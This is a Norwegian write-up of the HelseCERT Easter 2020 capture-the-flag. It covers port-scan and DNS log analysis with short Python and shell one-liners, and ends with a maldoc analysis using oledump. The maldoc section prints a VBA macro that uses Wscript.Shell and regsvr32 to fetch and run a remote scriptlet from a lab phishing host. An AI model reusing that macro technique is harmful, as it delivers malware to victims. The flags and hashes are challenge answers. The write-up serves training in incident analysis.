# Påskenøtter fra HelseCERT påsken 2020
## Challenge 1: portscann (5 poeng)
https://påskenøtter.helsectf.no/challenges#Vertikalt%20portscan

En påskekylling har akkurat kvittert en alarm med kritikalitet HØY som dukket opp på skjermen. Alarmen kommer fra et av de mange avanserte innbruddsystemene som analysesentret har tilgang på: Suricata. Alarmen viser at noen har kjørt et vertikalt portskann mot en av serverne som er eksponert ut mot internett.

Selv om denne påskekyllingen startet som en cyberoperatør i forrige uke er han godt kjent med portskanning. Etter å ha sett litt på alarmen gjør han derfor et uttrekk av tilhørende netflow data. Dette viser metainformasjon om den bidireksjonale (toveis) flyten av pakker mellom angriper og vår server.

Sjefsanalytikeren ønsker en rapport på hvor mange unike destinasjonsporter som angriper har forsøkt kartlagt. Kan du hjelpe påskekyllingen?

Kode finnes i [Challenge01](/challenge01):
```python
for line in mydata:
        datadict = json.loads(line)
        dp = datadict["dest_port"]
        if dp not in destports:
            destports.append(dp)
    numports = len(destports)
    md5ports = hashlib.md5(str(numports).encode('utf-8')).hexdigest()

```
Output:

```
Number of ports: 1000
MD5 of number of ports: a9b7ba70783b617e9998dc4dd82eb3c5
```
## Challenge 2: En åpen port (10 poeng)
https://påskenøtter.helsectf.no/challenges#En%20%C3%A5pen%20port

Finn en flow hvor antall bytes sendt fra server til klient er forskjellig fra de andre. 

Kode finnes i [Challenge02](/challenge02)

```python
for line in mydata:
        datadict = json.loads(line)
        if datadict["flow"]["bytes_toclient"] != 54:
            openport = datadict["dest_port"]
            break
```
Output:
```
Open port: 5822
MD5 of port number: fd2ae8ec902471d8956fca3486031013
```

## Challenge 3: Kartleggingsverktøy (15 poeng)
https://påskenøtter.helsectf.no/challenges#Kartleggingsverkt%C3%B8y

Kan du gjøre en videre analyse av loggene og finne ut hvilket verktøy og hvilken metode angriper kan ha brukt for å gjennomføre nettverksskanningen?

## Challenge 5: Subdomenescan - DNS (5 poeng)
https://påskenøtter.helsectf.no/challenges#Probing

Finn antall subdommener. 

Bruker en one-liner. Forklaring: 
- *cat* innhold i fil
- *jq* til å hente ut dns.rrname fra JSON output
- *grep* for å kun hente linjer med "journalsystem"
- *sort* -u for å fjerne duplikater
- *wc' -w for å telle ord
- *md5* for å regne ut hash

```bash
cat ../artefacts/eve-dns.json | jq '.dns.rrname' |grep journalsystem.ctf | sort -u | wc -w |md5
```
Output: `6c7fecb4a8c80e802a3fdade86809479`

## Challenge 6: IPv4 (10 poeng)
https://påskenøtter.helsectf.no/challenges#IPv4

Finn alle svar med A records. 
- Finn alle answers med rcode NOERROR
- Filtrer på rrtype A (A records = IPv4 adresser)

```
Existing domains identified: 
adminportal.journalsystem.ctf
webfront01.journalsystem.ctf
MD5: 17395d6abdbc5482cf852c2712865cd1
```



## Challenge 9: Maldoc
https://påskenøtter.helsectf.no/challenges#Registrert%20bibliotek

Bruker oledump for å identifisere makroer. 

Se [Challenge09](/challenge09) for output.
Passordet for maldoc i /artefacts-folderen er "healhty_nuts".



```
python3 oledump.py Overdue_Ticket_4825.doc 
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:     10906 '1Table'
  5:       408 'Macros/PROJECT'
  6:        65 'Macros/PROJECTwm'
  7: M    1957 'Macros/VBA/Module1'
  8: m    1097 'Macros/VBA/ThisDocument'
  9:      2703 'Macros/VBA/_VBA_PROJECT'
 10:      1234 'Macros/VBA/__SRP_0'
 11:       106 'Macros/VBA/__SRP_1'
 12:       220 'Macros/VBA/__SRP_2'
 13:        66 'Macros/VBA/__SRP_3'
 14:       570 'Macros/VBA/dir'
 15:    130309 'WordDocument'
```

Vi ser at stream 7+8 har makroer, vi dumper stream 7: 
`/oledump.py -s 7 --vbadecompressskipattributes Overdue_Ticket_4825.doc > macro1.txt`

Vi kan deretter lese makroen, og finner dette segmentet (cat macro1.txt):
```vb
Private Sub LetsGo()
    Dim shell
    Dim out
    Set shell = VBA.CreateObjet("Wscript.Shell")
    out = shell.Run("regsvr32 /u /n /s /i:http://this.url.looks.a.bit.phishy.lab/EGG{00099e44e9b6e8d4337cc29ccf436410}/ scrobj.dll", 0, False)
End Sub
```
og dermed blir påskeegget: `EGG{00099e44e9b6e8d4337cc29ccf436410}`.